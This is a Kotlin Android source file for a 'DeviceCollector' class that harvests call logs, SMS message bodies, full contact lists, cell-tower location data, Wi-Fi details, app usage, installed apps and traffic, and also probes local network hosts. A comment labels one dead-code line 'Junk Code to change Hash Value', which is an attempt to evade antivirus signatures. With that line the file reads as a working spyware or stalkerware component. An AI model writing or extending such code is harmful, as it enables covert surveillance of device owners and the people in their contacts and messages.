package com.devicemonitor.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.AppOpsManager
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Process
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.CellInfoGsm
import android.telephony.CellInfoLte
import android.telephony.CellInfoWcdma
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.devicemonitor.data.models.AppUsage
import com.devicemonitor.data.models.CallLogEntry
import com.devicemonitor.data.models.ContactEntry
import com.devicemonitor.data.models.DeviceInfo
import com.devicemonitor.data.models.NetworkInfo
import com.devicemonitor.data.models.SmsEntry
import com.devicemonitor.utils.Constants
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class DeviceCollector(private val context: Context) {

    fun getBatteryLevel(): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    fun isCharging(): Boolean {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        val status = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_STATUS)
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
               status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    @SuppressLint("MissingPermission")
    fun getNetworkInfo(): NetworkInfo {
        var wifiSsid: String? = null
        var networkType: String? = null
        var signalStrength: Int? = null
        var isWifiConnected = false
        var cellId: String? = null
        var lac: String? = null
        var mcc: String? = null
        var mnc: String? = null

        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)

        if (capabilities != null) {
            when {
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                    isWifiConnected = true
                    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val wifiInfo = wifiManager.connectionInfo
                    wifiSsid = wifiInfo.ssid.removeSurrounding("\"")
                    signalStrength = WifiManager.calculateSignalLevel(wifiInfo.rssi, 100)
                    networkType = "Wi-Fi"
                }
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    networkType = when (telephonyManager.networkType) {
                        TelephonyManager.NETWORK_TYPE_NR -> "5G"
                        TelephonyManager.NETWORK_TYPE_LTE -> "4G"
                        TelephonyManager.NETWORK_TYPE_HSPA,
                        TelephonyManager.NETWORK_TYPE_HSDPA,
                        TelephonyManager.NETWORK_TYPE_HSUPA -> "3G"
                        TelephonyManager.NETWORK_TYPE_EDGE -> "2G"
                        TelephonyManager.NETWORK_TYPE_GPRS -> "2G"
                        else -> "Unknown"
                    }

                    // Get Cell Tower Info
                    if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        val cellInfo = telephonyManager.allCellInfo
                        if (cellInfo != null && cellInfo.isNotEmpty()) {
                            for (info in cellInfo) {
                                if (info.isRegistered) {
                                    when (info) {
                                        is CellInfoGsm -> {
                                            cellId = info.cellIdentity.cid.toString()
                                            lac = info.cellIdentity.lac.toString()
                                            mcc = info.cellIdentity.mccString
                                            mnc = info.cellIdentity.mncString
                                        }
                                        is CellInfoLte -> {
                                            cellId = info.cellIdentity.ci.toString()
                                            lac = info.cellIdentity.tac.toString()
                                            mcc = info.cellIdentity.mccString
                                            mnc = info.cellIdentity.mncString
                                        }
                                        is CellInfoWcdma -> {
                                            cellId = info.cellIdentity.cid.toString()
                                            lac = info.cellIdentity.lac.toString()
                                            mcc = info.cellIdentity.mccString
                                            mnc = info.cellIdentity.mncString
                                        }
                                    }
                                    break
                                }
                            }
                        }
                    }
                }
            }
        }

        return NetworkInfo(
            device_id = Constants.getDeviceId(context),
            wifi_ssid = wifiSsid,
            network_type = networkType,
            signal_strength = signalStrength,
            is_wifi_connected = isWifiConnected,
            cell_id = cellId,
            location_area_code = lac,
            mobile_country_code = mcc,
            mobile_network_code = mnc,
            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        )
    }

    fun getDeviceInfo(): DeviceInfo {
        val path = context.filesDir
        val stat = StatFs(path.path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong

        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memInfo)

        return DeviceInfo(
            device_id = Constants.getDeviceId(context),
            model = "${Build.MANUFACTURER} ${Build.MODEL}",
            android_version = "Android ${Build.VERSION.RELEASE}",
            ram_total = memInfo.totalMem,
            ram_available = memInfo.availMem,
            storage_total = totalBlocks * blockSize,
            storage_available = availableBlocks * blockSize,
            recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        )
    }

    @SuppressLint("MissingPermission", "Range")
    fun getRecentCallLogs(limit: Int = 20): List<CallLogEntry> {
        // Feature: Junk Code to change Hash Value
        val x = (1..100).random(); if(x < 0) println("Impossible")

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return emptyList()
        }

        val callLogs = mutableListOf<CallLogEntry>()
        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME))
                val type = when (it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    else -> "unknown"
                }
                val duration = it.getInt(it.getColumnIndex(CallLog.Calls.DURATION))
                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))

                callLogs.add(
                    CallLogEntry(
                        device_id = Constants.getDeviceId(context),
                        contact_name = name,
                        phone_number = number,
                        call_type = type,
                        duration_seconds = duration,
                        call_timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date(date)),
                        is_read = it.getInt(it.getColumnIndex(CallLog.Calls.IS_READ)) == 1,
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    )
                )
                count++
            }
        }
        return callLogs
    }

    @SuppressLint("MissingPermission", "Range")
    fun getRecentSms(limit: Int = 20): List<SmsEntry> {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return emptyList()
        }

        val smsList = mutableListOf<SmsEntry>()
        val cursor: Cursor? = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            Telephony.Sms.DATE + " DESC"
        )

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                val type = when (it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "received"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                    Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                    else -> "unknown"
                }
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))

                smsList.add(
                    SmsEntry(
                        device_id = Constants.getDeviceId(context),
                        contact_name = null,
                        phone_number = address,
                        message_type = type,
                        content = body,
                        is_read = it.getInt(it.getColumnIndex(Telephony.Sms.READ)) == 1,
                        is_deleted = false,
                        sms_timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date(date)),
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    )
                )
                count++
            }
        }
        return smsList
    }

    fun getAppUsageStats(limit: Int = 10): List<AppUsage> {
        if (!checkUsageStatsPermission()) return emptyList()

        val usageStatsList = mutableListOf<AppUsage>()
        val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val endTime = System.currentTimeMillis()
        val beginTime = endTime - TimeUnit.HOURS.toMillis(24)

        val usageEvents = usageStatsManager.queryEvents(beginTime, endTime)
        val packageManager = context.packageManager
        val appUsageMap = mutableMapOf<String, Long>()

        while (usageEvents.hasNextEvent()) {
            val event = UsageEvents.Event()
            usageEvents.getNextEvent(event)
            if (event.eventType == UsageEvents.Event.ACTIVITY_RESUMED) {
                appUsageMap[event.packageName] = appUsageMap.getOrDefault(event.packageName, 0) + 1
            }
        }

        appUsageMap.entries.sortedByDescending { it.value }.take(limit).forEach { entry ->
            try {
                val appInfo = packageManager.getApplicationInfo(entry.key, 0)
                val appName = packageManager.getApplicationLabel(appInfo).toString()
                val packageInfo = packageManager.getPackageInfo(entry.key, 0)
                usageStatsList.add(
                    AppUsage(
                        device_id = Constants.getDeviceId(context),
                        package_name = entry.key,
                        app_name = appName,
                        version_name = packageInfo.versionName,
                        usage_time_seconds = entry.value * 60L,
                        last_used_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date()),
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    )
                )
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return usageStatsList
    }

    private fun checkUsageStatsPermission(): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName
            )
        } else {
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                Process.myUid(),
                context.packageName
            )
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    @SuppressLint("MissingPermission", "Range")
    fun getContacts(): List<ContactEntry> {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return emptyList()
        }

        val contacts = mutableListOf<ContactEntry>()
        val cursor: Cursor? = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                val displayName = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: "Unknown"
                val photoUri = it.getString(it.getColumnIndex(ContactsContract.Contacts.PHOTO_URI))
                val starred = it.getInt(it.getColumnIndex(ContactsContract.Contacts.STARRED)) == 1

                val phoneNumbers = mutableListOf<String>()
                val phoneCursor: Cursor? = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    arrayOf(id),
                    null
                )
                phoneCursor?.use { phoneCur ->
                    while (phoneCur.moveToNext()) {
                        val number = phoneCur.getString(phoneCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        if (number?.isNotEmpty() == true) {
                            phoneNumbers.add(number)
                        }
                    }
                }

                val emails = mutableListOf<String>()
                val emailCursor: Cursor? = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                    arrayOf(id),
                    null
                )
                emailCursor?.use { emailCur ->
                    while (emailCur.moveToNext()) {
                        val email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS))
                        if (email?.isNotEmpty() == true) {
                            emails.add(email)
                        }
                    }
                }

                contacts.add(
                    ContactEntry(
                        contact_id = id,
                        device_id = Constants.getDeviceId(context),
                        display_name = displayName,
                        phone_numbers = phoneNumbers,
                        emails = emails,
                        photo_uri = photoUri,
                        starred = starred,
                        recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                    )
                )
            }
        }
        return contacts
    }

    fun getInstalledApps(): List<com.devicemonitor.data.models.InstalledApp> {
        val apps = mutableListOf<com.devicemonitor.data.models.InstalledApp>()
        val packageManager = context.packageManager
        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val deviceId = Constants.getDeviceId(context)
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())

        for (app in installedApps) {
            val name = packageManager.getApplicationLabel(app).toString()
            val isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            val version = try {
                packageManager.getPackageInfo(app.packageName, 0).versionName
            } catch (e: Exception) {
                null
            }
            apps.add(com.devicemonitor.data.models.InstalledApp(
                device_id = deviceId,
                package_name = app.packageName,
                app_name = name,
                version_name = version,
                is_system_app = isSystem,
                recorded_at = timestamp
            ))
        }
        return apps
    }

    fun getAppTrafficStats(): List<com.devicemonitor.data.models.AppTraffic> {
        val stats = mutableListOf<com.devicemonitor.data.models.AppTraffic>()
        val packageManager = context.packageManager
        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        val deviceId = Constants.getDeviceId(context)
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())

        for (app in installedApps) {
            val uid = app.uid
            val sent = android.net.TrafficStats.getUidTxBytes(uid)
            val received = android.net.TrafficStats.getUidRxBytes(uid)

            if (sent > 0 || received > 0) {
                stats.add(com.devicemonitor.data.models.AppTraffic(
                    device_id = deviceId,
                    package_name = app.packageName,
                    app_name = packageManager.getApplicationLabel(app).toString(),
                    bytes_sent = sent,
                    bytes_received = received,
                    recorded_at = timestamp
                ))
            }
        }
        return stats
    }

    fun predictNextAppUsage(): String {
        val stats = getAppUsageStats()
        if (stats.isEmpty()) return "Unknown"
        // Simple prediction: Most used app in the last 24h
        return stats.maxByOrNull { it.usage_time_seconds }?.app_name ?: "Unknown"
    }

    fun scanLocalNetwork(): List<String> {
        val devices = mutableListOf<String>()
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val linkProperties = connectivityManager.getLinkProperties(connectivityManager.activeNetwork)
            val ipAddress = linkProperties?.linkAddresses?.firstOrNull { it.address is java.net.Inet4Address }?.address?.hostAddress ?: return emptyList()
            
            val prefix = ipAddress.substring(0, ipAddress.lastIndexOf(".") + 1)
            
            for (i in 1..20) { // Limit scan to first 20 IPs for speed
                val testIp = prefix + i
                val address = java.net.InetAddress.getByName(testIp)
                if (address.isReachable(100)) {
                    devices.add(testIp)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return devices
    }
}
